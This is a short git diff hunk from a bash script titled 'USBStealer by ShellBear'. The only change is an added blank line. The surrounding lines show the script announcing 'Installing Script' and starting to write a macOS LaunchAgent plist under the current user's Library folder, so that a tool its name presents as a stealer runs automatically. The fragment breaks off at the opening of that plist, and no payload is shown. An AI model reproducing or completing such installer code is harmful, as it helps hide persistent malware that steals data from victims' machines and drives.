@@ -1,6 +1,7 @@
 #!/bin/bash
 #USBStealer by ShellBear
 
+
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 echo "Installing Script "
 cat > /Users/$(whoami)/Library/LaunchAgents/com.ShellBear.USBStealer.plist <<EOF 
